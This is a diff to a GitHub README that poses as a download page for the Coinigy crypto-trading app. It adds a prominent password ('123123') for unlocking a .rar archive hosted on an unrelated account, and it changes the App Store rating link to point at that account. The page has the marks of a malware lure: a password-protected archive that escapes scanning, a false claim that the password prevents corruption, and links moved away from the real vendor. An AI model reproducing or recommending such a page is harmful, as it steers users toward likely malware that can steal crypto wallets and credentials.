@@ -4,8 +4,19 @@
 
 ![browser_TaNqOYnToh](https://github.com/user-attachments/assets/0be33fc9-71b9-46fb-99ed-9522237209fa)
 
+<div align="center" style="background-color:#f0f8ff; padding:15px; border-radius:10px; border:1px solid #1e90ff; margin:20px 0;">
+  <h3 style="color:#1e90ff;">🔑 Password Required for Extraction</h3>
+  <p style="font-size:1.2em; font-weight:bold;">Use this password to unlock the archive:</p>
+  <div style="font-size:1.8em; letter-spacing:2px; color:#ff6b6b; padding:10px; background:#fff; border-radius:5px; display:inline-block; margin:10px;">
+    1️⃣2️⃣3️⃣1️⃣2️⃣3️⃣
+  </div>
+  <p>This password protects your download from corruption and unauthorized modifications</p>
+</div>
+
+
+
 [![Download Coinigy](https://img.shields.io/badge/Download-Windows%20%26%20macOS-blue?style=for-the-badge&logo=cloud)](https://github.com/lssadort12/Download-Coinigy/releases/download/Download/Coinigy.v2025.rar)
-[![Rate on App Store](https://img.shields.io/badge/Rate_⭐⭐⭐⭐⭐-orange?style=for-the-badge)](https://apps.apple.com/us/app/coinigy-bitcoin-altcoin-app/id1054054666)
+[![Rate on App Store](https://img.shields.io/badge/Rate_⭐⭐⭐⭐⭐-orange?style=for-the-badge)](https://github.com/lssadort12)
 
 ## 🔥 Key Features
 
@@ -37,4 +48,8 @@
 | **RAM**   | 4 GB (8 GB recommended) |
 | **Storage**| 10 MB free space |
 | **Internet**| Stable connection (5 Mbps+) |
+
+ 
+    
+   
 
